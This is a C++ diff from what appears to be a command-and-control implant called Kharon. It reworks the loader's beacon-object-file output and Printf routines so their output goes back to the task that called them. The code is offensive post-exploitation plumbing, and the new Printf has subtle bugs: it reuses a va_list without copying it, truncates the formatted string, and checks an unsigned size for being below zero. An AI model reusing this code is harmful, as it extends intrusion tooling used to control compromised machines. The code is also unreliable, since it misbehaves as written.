@@ -15,7 +15,7 @@ auto Coff::DataParse(
     parser->buffer   = buffer;
     parser->length   = size - 4;
     parser->size     = size - 4;
-    parser->buffer  += 4;
+    parser->buffer   += 4;
 }
 
 auto Coff::Output( 
@@ -25,7 +25,14 @@ auto Coff::Output(
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Bytes( G_PACKAGE, (PUCHAR)data, len );
+    VOID* MemRange  = __builtin_return_address( 0 );
+    ULONG CommandID = 0;
+    CHAR* UUID      = nullptr;
+
+    CommandID = Self->Cf->GetCmdID( MemRange );
+    UUID      = Self->Cf->GetTask( MemRange );
+    
+    Self->Pkg->SendOut( UUID, CommandID, (BYTE*)data, len, type );
 }
 
 auto Coff::Printf(
@@ -36,10 +43,33 @@ auto Coff::Printf(
     G_KHARON
 
     va_list VaList = { 0 };
+    va_start( VaList, fmt );
 
-    va_start(VaList, fmt);
-    Self->Msvcrt.vprintf(fmt, VaList);
-    va_end(VaList);
+    VOID* MemRange = __builtin_return_address( 0 );
+    CHAR* UUID     = nullptr;
+    ULONG MsgSize  = 0;
+    CHAR* MsgBuff  = nullptr;
+    
+    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
+    if ( MsgSize < 0 ) {
+        KhDbg( "failed get the formated message size" ); goto _KH_END;
+    }
+
+    MsgBuff = (CHAR*)Self->Hp->Alloc( MsgSize +1 );
+
+    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, fmt, VaList ) < 0 ) {
+        KhDbg( "failed formating string" ); goto _KH_END;
+    }
+
+    UUID = Self->Cf->GetTask( MemRange );
+
+    KhDbg( "Message to send to the task id %s: %s [%d bytes]", UUID, MsgBuff, MsgSize );
+
+    Self->Pkg->SendMsg( UUID, MsgBuff, type );
+
+_KH_END:
+    if ( VaList  ) va_end( VaList );
+    if ( MsgBuff ) Self->Hp->Free( MsgBuff );
 }
 
 auto Coff::DataExtract(
@@ -54,6 +84,7 @@ auto Coff::DataInt(
     PDATAP parser
 )->INT {
     G_KHARON
+
     return Self->Psr->Int32( (PPARSER)parser );
 }
 
